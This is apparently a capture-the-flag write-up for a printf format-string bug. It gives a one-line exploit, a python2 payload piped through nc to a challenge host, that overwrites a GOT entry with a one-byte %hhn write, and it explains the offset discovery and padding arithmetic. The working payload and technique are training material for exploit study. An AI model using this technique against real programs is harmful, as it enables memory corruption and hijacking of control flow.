VULN:
Format printf used to overwrite GOT


EXPLOIT:
(python2 -c 'print "\x10\xa0\x04\x08%133x%7$hhn"') | nc webctf.it 6000


WRITEUP:
Inser as input: AAAA%x-%x-%x-%x-%x-%x-%x
See that 0x41414141 is in 7th position (%7$)
Have to write only 1 byte, so "hhn" ("hn" are 2 bytes and "n" are 4 bytes)
\x10\xa0\x04\x08 is the address which I have to write to
%133x is 0x89 (the value I have to put into memory) minus 4 bytes used for the address
